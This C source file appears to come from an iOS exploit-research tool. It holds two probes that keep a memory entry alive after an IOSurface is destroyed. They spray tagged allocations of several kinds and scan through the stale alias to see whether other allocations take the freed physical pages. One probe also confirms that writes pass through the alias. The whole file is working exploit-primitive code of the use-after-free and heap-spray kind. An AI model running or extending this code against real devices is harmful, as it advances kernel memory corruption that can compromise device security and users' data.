/* `--iosurfrace` proved a surviving memory entry names the physical   */
/* pages of a destroyed IOSurface and follows them into a NEW          */
/* IOSurface. This probe asks the next question: can those pages be    */
/* taken by an allocation that is NOT an IOSurface?                    */
/*                                                                     */
/* Method: for each (surface kind, reclaimer kind) pair, create a     */
/* fresh surface, wrap its base in a memory entry, confirm the alias,  */
/* deallocate every user mapping, destroy the surface, then spray one  */
/* reclaimer type whose blocks carry unique tags. Re-map the entry and */
/* scan the whole object for a tag. A tag seen through the stale alias */
/* means an allocation outside the IOSurface allocator landed on the   */
/* released physical pages - cross-type reclamation.                   */
/*                                                                     */
/* Reclaimer kinds: vm_allocate, anonymous mmap, malloc, file-backed   */
/* mmap, and IOSurface itself (positive control).                      */
/*                                                                     */
/* All writes are 4 bytes into blocks this app owns, or into a         */
/* reclaimed IOSurface this app created. Reads through the stale       */
/* alias are bounded to the object size.                               */
/* ------------------------------------------------------------------ */

#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

enum {
    RCL_KIND_VM = 1,
    RCL_KIND_MMAP_ANON,
    RCL_KIND_MALLOC,
    RCL_KIND_FILE,
    RCL_KIND_IOSRF
};

#define RCL_N 48
#define RCL_ALLOC 0x8000

static void      *g_rcl_ptr[RCL_N];
static size_t     g_rcl_len[RCL_N];
static int        g_rcl_kind[RCL_N];
static int        g_rcl_n;

static iosr_ref_t g_rcl_surf[RCL_N];
static int        g_rcl_nsurf;

typedef struct { uint32_t tag; int kind; int idx; } rcl_tag_t;
static rcl_tag_t  g_rcl_tag[RCL_N];
static int        g_rcl_ntag;

static uint32_t rcl_tag_of(int kind, int idx)
{
    return 0x5A5A0000u | ((uint32_t)(kind & 0xF) << 12) | (uint32_t)(idx & 0xFFF);
}

static void rcl_track(void *p, size_t len, int kind)
{
    if (g_rcl_n >= RCL_N) return;
    g_rcl_ptr[g_rcl_n] = p;
    g_rcl_len[g_rcl_n] = len;
    g_rcl_kind[g_rcl_n] = kind;
    g_rcl_n++;
}

static void rcl_record(int kind, int idx)
{
    if (g_rcl_ntag >= RCL_N) return;
    g_rcl_tag[g_rcl_ntag].tag = rcl_tag_of(kind, idx);
    g_rcl_tag[g_rcl_ntag].kind = kind;
    g_rcl_tag[g_rcl_ntag].idx = idx;
    g_rcl_ntag++;
}

static void rcl_release_all(void)
{
    for (int i = 0; i < g_rcl_n; i++) {
        if (!g_rcl_ptr[i]) continue;
        switch (g_rcl_kind[i]) {
        case RCL_KIND_VM:
            vm_deallocate(mach_task_self(), (vm_address_t)g_rcl_ptr[i],
                          (vm_size_t)g_rcl_len[i]);
            break;
        case RCL_KIND_MMAP_ANON:
        case RCL_KIND_FILE:
            munmap(g_rcl_ptr[i], g_rcl_len[i]);
            break;
        case RCL_KIND_MALLOC:
            free(g_rcl_ptr[i]);
            break;
        default:
            break;
        }
        g_rcl_ptr[i] = NULL;
    }
    for (int i = 0; i < g_rcl_nsurf; i++) {
        if (g_rcl_surf[i]) CFRelease(g_rcl_surf[i]);
        g_rcl_surf[i] = NULL;
    }
    g_rcl_n = 0;
    g_rcl_nsurf = 0;
}

static int rcl_spray_vm(size_t len, int kind)
{
    int made = 0;
    for (int i = 0; i < RCL_N; i++) {
        vm_address_t a = 0;
        kern_return_t kr = vm_allocate(mach_task_self(), &a, (vm_size_t)len,
                                       VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS || a == 0) break;
        *(volatile uint32_t *)(uintptr_t)a = rcl_tag_of(kind, i);
        rcl_track((void *)(uintptr_t)a, len, kind);
        rcl_record(kind, i);
        made++;
    }
    return made;
}

static int rcl_spray_mmap(size_t len, int kind)
{
    int made = 0;
    for (int i = 0; i < RCL_N; i++) {
        void *p = mmap(NULL, len, PROT_READ | PROT_WRITE,
                       MAP_ANON | MAP_PRIVATE, -1, 0);
        if (p == MAP_FAILED) break;
        *(volatile uint32_t *)(uintptr_t)p = rcl_tag_of(kind, i);
        rcl_track(p, len, kind);
        rcl_record(kind, i);
        made++;
    }
    return made;
}

static int rcl_spray_malloc(size_t len, int kind)
{
    int made = 0;
    for (int i = 0; i < RCL_N; i++) {
        void *p = malloc(len);
        if (!p) break;
        *(volatile uint32_t *)(uintptr_t)p = rcl_tag_of(kind, i);
        rcl_track(p, len, kind);
        rcl_record(kind, i);
        made++;
    }
    return made;
}

static int rcl_spray_file(const char *dir, size_t len, int kind)
{
    char path[512];
    snprintf(path, sizeof(path), "%s/rclfile.bin", dir ? dir : "/tmp");
    int fd = open(path, O_CREAT | O_RDWR | O_TRUNC, 0600);
    if (fd < 0) {
        mep_log("[-] iosurfreclaim: open(%s) failed errno=%d", path, errno);
        return 0;
    }
    if (ftruncate(fd, (off_t)len * RCL_N) != 0) {
        mep_log("[-] iosurfreclaim: ftruncate failed errno=%d", errno);
        close(fd);
        return 0;
    }
    int made = 0;
    for (int i = 0; i < RCL_N; i++) {
        void *p = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                       (off_t)i * (off_t)len);
        if (p == MAP_FAILED) break;
        *(volatile uint32_t *)(uintptr_t)p = rcl_tag_of(kind, i);
        msync(p, len, MS_ASYNC);
        rcl_track(p, len, kind);
        rcl_record(kind, i);
        made++;
    }
    close(fd);
    return made;
}

static int rcl_spray_iosrf(size_t len, int kind, int use_region)
{
    int made = 0;
    for (int i = 0; i < RCL_N; i++) {
        iosr_ref_t s = iosr_make_sized(use_region, (long)len);
        if (!s) break;
        void *base = g_iosr_getbase(s);
        if (base) *(volatile uint32_t *)(uintptr_t)base = rcl_tag_of(kind, i);
        if (g_rcl_nsurf < RCL_N) g_rcl_surf[g_rcl_nsurf++] = s;
        rcl_record(kind, i);
        made++;
    }
    return made;
}

/* Map the surviving entry and scan it for any tag recorded this round.
   Returns 1 on a match, 0 on none, -1 if the entry could not be mapped. */
static int rcl_check(mach_port_t obj, mach_vm_size_t esz, int round,
                     int *hit_kind, int *hit_idx, uint64_t *hit_off,
                     uint32_t *w0)
{
    mach_vm_address_t a = 0;
    kern_return_t kr = g_iosr_vm_map(mach_task_self(), &a, esz, 0,
                                     VM_FLAGS_ANYWHERE, obj, 0, FALSE,
                                     VM_PROT_READ | VM_PROT_WRITE,
                                     VM_PROT_READ | VM_PROT_WRITE,
                                     VM_INHERIT_NONE);
    if (w0) *w0 = 0;
    mep_log("[*] iosurfreclaim r%d map entry -> kr=%d (0x%x) at 0x%llx",
            round, (int)kr, (unsigned)kr, (unsigned long long)a);
    if (kr != KERN_SUCCESS || a == 0) return -1;

    uint32_t first = *(volatile uint32_t *)(uintptr_t)a;
    if (w0) *w0 = first;
    int found = 0;
    for (size_t off = 0; off + 4 <= esz; off += 4) {
        uint32_t v = *(volatile uint32_t *)(uintptr_t)(a + off);
        for (int i = 0; i < g_rcl_ntag; i++) {
            if (v == g_rcl_tag[i].tag) {
                mep_log("[*] iosurfreclaim r%d MATCH kind=%d idx=%d off=0x%zx val=0x%08x",
                        round, g_rcl_tag[i].kind, g_rcl_tag[i].idx, off, v);
                *hit_kind = g_rcl_tag[i].kind;
                *hit_idx = g_rcl_tag[i].idx;
                *hit_off = off;
                found = 1;
                break;
            }
        }
        if (found) break;
    }
    if (!found)
        mep_log("[*] iosurfreclaim r%d no tag visible; word0=0x%08x", round, first);
    vm_deallocate(mach_task_self(), (vm_address_t)a, (vm_size_t)esz);
    return found;
}

/* One (surface kind, reclaimer kind) experiment. */
static int rcl_round(const char *dir, int use_region, size_t alloc, int sweeper,
                     int round_no, int *stage_val)
{
    int hit_kind = 0, hit_idx = -1, found = 0, made = 0;
    uint64_t hit_off = 0;
    uint32_t w0 = 0;

    rcl_release_all();
    g_rcl_ntag = 0;

    iosr_ref_t s = iosr_make_sized(use_region, (long)alloc);
    if (!s) {
        mep_log("[-] iosurfreclaim: surface create failed region=%d alloc=0x%zx",
                use_region, alloc);
        return -1;
    }
    uint64_t base = (uint64_t)(uintptr_t)g_iosr_getbase(s);
    size_t asz = g_iosr_getalloc(s);
    uint32_t marker = 0xC0DE0000u | (uint32_t)(use_region & 1);
    if (base) *(volatile uint32_t *)(uintptr_t)base = marker;
    uint32_t rb = base ? *(volatile uint32_t *)(uintptr_t)base : 0;
    mep_log("[*] iosurfreclaim r%d region=%d alloc=0x%zx id=0x%x base=0x%llx marker=0x%08x rb=0x%08x",
            round_no, use_region, asz, g_iosr_getid(s),
            (unsigned long long)base, marker, rb);

    mach_vm_size_t esz = (mach_vm_size_t)asz;
    mach_port_t obj = MACH_PORT_NULL;
    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &esz,
                                                 (mach_vm_offset_t)base,
                                                 VM_PROT_READ | VM_PROT_WRITE,
                                                 &obj, MACH_PORT_NULL);
    mep_log("[*] iosurfreclaim r%d entry(size=0x%llx) -> kr=%d (0x%x) handle=0x%x",
            round_no, (unsigned long long)esz, (int)kr, (unsigned)kr,
            (unsigned)obj);
    if (kr != KERN_SUCCESS || obj == MACH_PORT_NULL) {
        CFRelease(s);
        return -1;
    }

    mach_vm_address_t a1 = 0;
    kr = g_iosr_vm_map(mach_task_self(), &a1, esz, 0, VM_FLAGS_ANYWHERE, obj, 0,
                       FALSE, VM_PROT_READ | VM_PROT_WRITE,
                       VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
    uint32_t m1 = 0;
    if (kr == KERN_SUCCESS && a1) m1 = *(volatile uint32_t *)(uintptr_t)a1;
    mep_log("[*] iosurfreclaim r%d alias1 kr=%d marker=0x%08x same=%s",
            round_no, (int)kr, m1, (m1 == marker) ? "YES" : "no");
    if (a1) vm_deallocate(mach_task_self(), (vm_address_t)a1, (vm_size_t)esz);

    CFRelease(s);
    mep_log("[*] iosurfreclaim r%d surface released; only the entry remains",
            round_no);

    switch (sweeper) {
    case RCL_KIND_VM:        made = rcl_spray_vm(alloc, sweeper); break;
    case RCL_KIND_MMAP_ANON: made = rcl_spray_mmap(alloc, sweeper); break;
    case RCL_KIND_MALLOC:    made = rcl_spray_malloc(alloc, sweeper); break;
    case RCL_KIND_FILE:      made = rcl_spray_file(dir, alloc, sweeper); break;
    case RCL_KIND_IOSRF:     made = rcl_spray_iosrf(alloc, sweeper, use_region); break;
    default: break;
    }
    mep_log("[*] iosurfreclaim r%d sweep kind=%d made=%d", round_no, sweeper, made);

    if (sweeper == RCL_KIND_IOSRF) {
        for (int i = 0; i < g_rcl_nsurf; i++) {
            uint64_t b = (uint64_t)(uintptr_t)g_iosr_getbase(g_rcl_surf[i]);
            if (b == base) {
                mep_log("[*] iosurfreclaim r%d old base handed to sprayed surface idx=%d",
                        round_no, i);
                break;
            }
        }
    }

    found = rcl_check(obj, esz, round_no, &hit_kind, &hit_idx, &hit_off, &w0);

    /* Write-direction confirmation, only when the reclaimer is a surface we
       own and positively identified: write through the stale alias and read
       through the reclaimed surface's own mapping. */
    if (found && sweeper == RCL_KIND_IOSRF && hit_idx >= 0 &&
        hit_idx < g_rcl_nsurf && g_rcl_surf[hit_idx]) {
        mach_vm_address_t a2 = 0;
        kr = g_iosr_vm_map(mach_task_self(), &a2, esz, 0, VM_FLAGS_ANYWHERE,
                           obj, 0, FALSE, VM_PROT_READ | VM_PROT_WRITE,
                           VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
        if (kr == KERN_SUCCESS && a2) {
            uint32_t wv = 0x88880000u | (uint32_t)(round_no & 0xff);
            *(volatile uint32_t *)(uintptr_t)a2 = wv;
            uint32_t ob = *(volatile uint32_t *)(uintptr_t)
                              g_iosr_getbase(g_rcl_surf[hit_idx]);
            mep_log("[*] iosurfreclaim WRITE-DIR: wrote 0x%08x through stale alias, "
                    "reclaimed surface reads 0x%08x -> %s",
                    wv, ob, (ob == wv) ? "CONFIRMED" : "no");
            vm_deallocate(mach_task_self(), (vm_address_t)a2, (vm_size_t)esz);
        }
    }

    mep_log("[*] iosurfreclaim r%d VERDICT hit=%d kind=%d idx=%d off=0x%llx "
            "word0=0x%08x marker_intact=%s",
            round_no, found, hit_kind, hit_idx, (unsigned long long)hit_off, w0,
            (w0 == marker) ? "YES" : "no");

    mach_port_deallocate(mach_task_self(), obj);
    if (stage_val) *stage_val = found ? 1 : 0;
    return found;
}

int iosurf_reclaim_probe(const char *dir, int *stages)
{
    if (!stages) return -1;
    for (int i = 0; i < 32; i++) stages[i] = 0;

    void *fh = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
                      RTLD_NOW);
    if (!fh) fh = dlopen("IOSurface", RTLD_NOW);
    if (!fh) {
        mep_log("[-] iosurfreclaim: dlopen IOSurface failed: %s", dlerror());
        return 0;
    }

    g_iosr_create  = (iosr_create_fn)dlsym(fh, "IOSurfaceCreate");
    g_iosr_getid   = (iosr_getid_fn)dlsym(fh, "IOSurfaceGetID");
    g_iosr_getbase = (iosr_getbase_fn)dlsym(fh, "IOSurfaceGetBaseAddress");
    g_iosr_getalloc = (iosr_getalloc_fn)dlsym(fh, "IOSurfaceGetAllocSize");
    void *lh = dlopen("/usr/lib/libSystem.B.dylib", RTLD_NOW);
    g_iosr_vm_map = (iosr_mach_vm_map_fn)dlsym(lh ? lh : RTLD_DEFAULT,
                                               "mach_vm_map");

    mep_log("[*] iosurfreclaim syms create=%p id=%p base=%p alloc=%p mach_vm_map=%p",
            (void *)g_iosr_create, (void *)g_iosr_getid, (void *)g_iosr_getbase,
            (void *)g_iosr_getalloc, (void *)g_iosr_vm_map);
    if (!g_iosr_create || !g_iosr_getid || !g_iosr_getbase ||
        !g_iosr_getalloc || !g_iosr_vm_map) {
        mep_log("[-] iosurfreclaim: a required symbol is missing");
        return 0;
    }

    static const int sweepers[] = {
        RCL_KIND_VM, RCL_KIND_MMAP_ANON, RCL_KIND_MALLOC, RCL_KIND_FILE,
        RCL_KIND_IOSRF
    };
    static const char *names[] = { "?", "vm", "mmap", "malloc", "file", "iosrf" };

    rcl_release_all();
    int rn = 0;

    /* Sets 1-2: PurpleGfxMem and plain surfaces at 0x8000, five reclaimers. */
    for (int ur = 0; ur < 2; ur++) {
        for (int si = 0; si < 5; si++) {
            int st = 0;
            rcl_round(dir, ur, RCL_ALLOC, sweepers[si], rn, &st);
            mep_log("[*] iosurfreclaim round %d region=%d sweeper=%s stage=%d",
                    rn, ur, names[sweepers[si]], st);
            stages[rn] = st;
            rn++;
        }
    }

    /* Set 3: IOSurface-vs-IOSurface recycling across size classes (control). */
    size_t cls[] = { 0x4000, 0x8000, 0x10000 };
    for (int ci = 0; ci < 3; ci++) {
        int st = 0;
        rcl_round(dir, 1, cls[ci], RCL_KIND_IOSRF, rn, &st);
        mep_log("[*] iosurfreclaim round %d region=1 sweeper=iosrf class=0x%zx stage=%d",
                rn, cls[ci], st);
        stages[rn] = st;
        rn++;
    }

    rcl_release_all();
    int hits = 0;
    for (int i = 0; i < rn; i++) if (stages[i]) hits++;
    mep_log("[*] iosurfreclaim done rounds=%d hits=%d", rn, hits);
    return 0;
}

/* ===================================================================== */
/* iosurfhold: does ANY non-IOSurface allocator take the freed pages of a  */
/* PurpleGfxMem surface while no user mapping pins them?                  */
/*                                                                        */
/* The reclaim sweep (`--iosurfreclaim`) only tested app-reachable         */
/* reclaimers allocated after the release. This probe keeps the carveout   */
/* window open, drives heavy kernel churn, and watches the stale memory    */
/* entry word-by-word: any content change anywhere in the range is a       */
/* positive hit - the reclaimer's type does not have to be known or tagged. */
/* Round 0 is an in-run positive control: fresh PurpleGfxMem surfaces are   */
/* created immediately after the release and are expected to take the      */
/* pages and overwrite the marker pattern.                                 */
/* ===================================================================== */

#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <CoreFoundation/CoreFoundation.h>

#define HOLD_ALLOC   0x8000
#define HOLD_ITERS   48
#define HOLD_CHURN_N 48

static uint32_t hold_expected(size_t off)
{
    return 0xC0DE0000u | (uint32_t)((off >> 2) & 0x000FFFFFu);
}

/* Count words that differ from the per-offset marker; report the first one. */
static uint64_t hold_scan(mach_vm_address_t a, size_t len,
                          uint32_t *first_off, uint32_t *first_got)
{
    uint64_t bad = 0;
    uint32_t fo = 0xffffffffu, fg = 0;
    for (size_t off = 0; off + 4 <= len; off += 4) {
        uint32_t v = *(volatile uint32_t *)(uintptr_t)(a + off);
        if (v != hold_expected(off)) {
            if (bad == 0) { fo = (uint32_t)off; fg = v; }
            bad++;
            if (bad > 0xFFFFFFu) break;
        }
    }
    if (first_off) *first_off = fo;
    if (first_got) *first_got = fg;
    return bad;
}

/* One burst of kernel allocation churn. Everything created is destroyed     */
/* before returning: no fd/port leak, no unbounded growth. kind 5 uses plain */
/* (non-region) IOSurfaces as an internal negative control.                 */
static int hold_churn(const char *dir, int kind, int n)
{
    int made = 0;
    switch (kind) {
    case 0: {   /* sockets: TCP / UDP / AF_UNIX stream / raw(denied) */
        for (int i = 0; i < n; i++) {
            int fam = AF_INET, type = SOCK_STREAM;
            if ((i % 4) == 1) type = SOCK_DGRAM;
            if ((i % 4) == 2) { fam = AF_UNIX; type = SOCK_STREAM; }
            if ((i % 4) == 3) type = SOCK_RAW;
            int fd = socket(fam, type, 0);
            if (fd >= 0) {
                int one = 1;
                setsockopt(fd, SOL_SOCKET, SO_NOSIGPIPE, &one, sizeof(one));
                close(fd);
                made++;
            }
        }
        break;
    }
    case 1:     /* pipes */
        for (int i = 0; i < n; i++) {
            int p[2];
            if (pipe(p) == 0) {
                (void)!write(p[1], "x", 1);
                close(p[0]);
                close(p[1]);
                made++;
            }
        }
        break;
    case 2: {   /* VM allocations + writes */
        for (int i = 0; i < n; i++) {
            vm_address_t a = 0;
            if (vm_allocate(mach_task_self(), &a, 0x4000, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
                *(volatile uint32_t *)(uintptr_t)a = 0x11223344u;
                vm_deallocate(mach_task_self(), a, 0x4000);
                made++;
            }
        }
        break;
    }
    case 3: {   /* temp files */
        char path[256];
        for (int i = 0; i < n; i++) {
            snprintf(path, sizeof(path), "%s/hold_%d_%d", dir, kind, i);
            int fd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0600);
            if (fd >= 0) {
                (void)!write(fd, path, strlen(path));
                close(fd);
                unlink(path);
                made++;
            }
        }
        break;
    }
    case 4: {   /* mach ports */
        for (int i = 0; i < n; i++) {
            mach_port_t p = MACH_PORT_NULL;
            if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS) {
                mach_port_destroy(mach_task_self(), p);
                made++;
            }
        }
        break;
    }
    case 5: {   /* plain IOSurfaces: different backing object */
        for (int i = 0; i < n; i++) {
            iosr_ref_t s = iosr_make(0);
            if (s) { CFRelease(s); made++; }
        }
        break;
    }
    default:
        break;
    }
    return made;
}

typedef int (*hold_churn_fn)(int round_idx, int iteration);
static hold_churn_fn g_hold_cb;
void hold_set_callback(hold_churn_fn cb) { g_hold_cb = cb; }

int iosurf_hold_probe(const char *dir, int rounds, int *stages)
{
    if (!stages) return -1;
    for (int i = 0; i < 64; i++) stages[i] = 0;
    if (rounds <= 0) rounds = 4;

    void *fh = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
                      RTLD_NOW);
    if (!fh) fh = dlopen("IOSurface", RTLD_NOW);
    if (!fh) {
        mep_log("[-] iosurfhold: dlopen IOSurface failed: %s", dlerror());
        return 0;
    }
    g_iosr_create  = (iosr_create_fn)dlsym(fh, "IOSurfaceCreate");
    g_iosr_getid   = (iosr_getid_fn)dlsym(fh, "IOSurfaceGetID");
    g_iosr_getbase = (iosr_getbase_fn)dlsym(fh, "IOSurfaceGetBaseAddress");
    g_iosr_getalloc = (iosr_getalloc_fn)dlsym(fh, "IOSurfaceGetAllocSize");
    void *lh = dlopen("/usr/lib/libSystem.B.dylib", RTLD_NOW);
    g_iosr_vm_map = (iosr_mach_vm_map_fn)dlsym(lh ? lh : RTLD_DEFAULT,
                                               "mach_vm_map");
    if (!g_iosr_create || !g_iosr_getid || !g_iosr_getbase ||
        !g_iosr_getalloc || !g_iosr_vm_map) {
        mep_log("[-] iosurfhold: a required symbol is missing");
        return 0;
    }

    mep_log("[*] iosurfhold start alloc=0x%x iters=%d churn=%d rounds=%d",
            HOLD_ALLOC, HOLD_ITERS, HOLD_CHURN_N, rounds);

    static const int churn_kinds[6] = { 0, 1, 2, 3, 4, 5 };
    int rn = 0;
    uint64_t test_worst = 0;

    for (int r = 0; r < rounds && rn < 60; r++) {
        int ctrl = (r == 0);
        iosr_ref_t s = iosr_make_sized(1, HOLD_ALLOC);
        if (!s) {
            mep_log("[-] iosurfhold round %d: region surface create failed", r);
            stages[rn++] = -1;
            continue;
        }
        uint64_t base = (uint64_t)(uintptr_t)g_iosr_getbase(s);
        size_t alloc = g_iosr_getalloc(s);
        for (size_t off = 0; off + 4 <= alloc; off += 4)
            *(volatile uint32_t *)(uintptr_t)(base + off) = hold_expected(off);
        uint32_t w0 = *(volatile uint32_t *)(uintptr_t)base;

        mach_vm_size_t esz = (mach_vm_size_t)alloc;
        mach_port_t obj = MACH_PORT_NULL;
        kern_return_t kr = mach_make_memory_entry_64(
            mach_task_self(), &esz, (mach_vm_offset_t)base,
            VM_PROT_READ | VM_PROT_WRITE, &obj, MACH_PORT_NULL);
        mep_log("[*] iosurfhold r%d ctrl=%d id=0x%x base=0x%llx alloc=0x%zx "
                "marker=0x%08x entryKR=%d handle=0x%x",
                r, ctrl, g_iosr_getid(s), (unsigned long long)base, alloc, w0,
                (int)kr, (unsigned)obj);
        if (kr != KERN_SUCCESS || obj == MACH_PORT_NULL) {
            CFRelease(s);
            stages[rn++] = -2;
            continue;
        }

        /* Confirm the alias, then drop every user mapping before release. */
        mach_vm_address_t a1 = 0;
        kr = g_iosr_vm_map(mach_task_self(), &a1, esz, 0, VM_FLAGS_ANYWHERE,
                           obj, 0, FALSE, VM_PROT_READ | VM_PROT_WRITE,
                           VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
        uint32_t m1 = (kr == KERN_SUCCESS && a1)
                          ? *(volatile uint32_t *)(uintptr_t)a1 : 0xdeadbeefu;
        if (a1) vm_deallocate(mach_task_self(), (vm_address_t)a1, (vm_size_t)esz);
        mep_log("[*] iosurfhold r%d alias1 kr=%d marker=0x%08x same=%s "
                "(no user mapping remains)",
                r, (int)kr, m1, (m1 == hold_expected(0)) ? "YES" : "no");

        CFRelease(s);
        mep_log("[*] iosurfhold r%d surface released; window open%s",
                r, ctrl ? " (control: spray fresh region surfaces)" : "");

        if (ctrl) {
            int kept = iosr_spray(1, 8);
            int idx = iosr_find_base(base);
            for (int i = 0; i < kept; i++)
                *(volatile uint32_t *)(uintptr_t)g_iosr_getbase(g_iosr_keep[i]) =
                    0x5A5A0000u | (uint32_t)i;
            mep_log("[*] iosurfhold r%d control spray kept=%d old_base_reused=%s idx=%d",
                    r, kept, idx >= 0 ? "YES" : "no", idx);
        }

        /* Watch loop: map briefly, scan, unmap, churn. Iteration 0 runs before
           any churn so the immediate post-release state is recorded too. */
        uint64_t worst = 0;
        uint32_t woff = 0, wgot = 0;
        int changed_iters = 0, map_fail = 0;
        for (int it = 0; it < HOLD_ITERS; it++) {
            mach_vm_address_t a2 = 0;
            kr = g_iosr_vm_map(mach_task_self(), &a2, esz, 0, VM_FLAGS_ANYWHERE,
                               obj, 0, FALSE, VM_PROT_READ | VM_PROT_WRITE,
                               VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
            if (kr == KERN_SUCCESS && a2) {
                uint32_t fo = 0xffffffffu, fg = 0;
                uint64_t bad = hold_scan(a2, esz, &fo, &fg);
                if (bad > worst) { worst = bad; woff = fo; wgot = fg; }
                if (bad) changed_iters++;
                vm_deallocate(mach_task_self(), (vm_address_t)a2, (vm_size_t)esz);
            } else {
                map_fail++;
            }
            int made = hold_churn(dir, churn_kinds[it % 6], HOLD_CHURN_N);
            if (g_hold_cb) {
                int cm = (int)g_hold_cb(r, it);
                if (it % 12 == 0)
                    mep_log("[*] iosurfhold r%d watch it=%d extChurn=%d", r, it, cm);
            }
            if (it == 0 || it % 12 == 11)
                mep_log("[*] iosurfhold r%d watch it=%d worstMismatch=%llu "
                        "changedIters=%d mapFail=%d churnMade=%d",
                        r, it, (unsigned long long)worst, changed_iters,
                        map_fail, made);
            usleep(40000);
        }

        mep_log("[*] iosurfhold r%d VERDICT ctrl=%d worstMismatch=%llu firstOff=0x%x "
                "firstVal=0x%x changedIters=%d/%d mapFail=%d",
                r, ctrl, (unsigned long long)worst, woff, wgot, changed_iters,
                HOLD_ITERS, map_fail);
        stages[rn++] = (worst > 0x7FFFFFFFu) ? 0x7FFFFFFF : (int)worst;
        if (!ctrl && worst > test_worst) test_worst = worst;

        mach_port_deallocate(mach_task_self(), obj);
        iosr_release_all();
    }

    mep_log("[*] iosurfhold done rounds=%d testWorstMismatch=%llu -> %s",
            rn, (unsigned long long)test_worst,
            test_worst ? "SOMETHING TOOK THE PAGES" : "no non-IOSurface reclaimer seen");
    return 0;
}
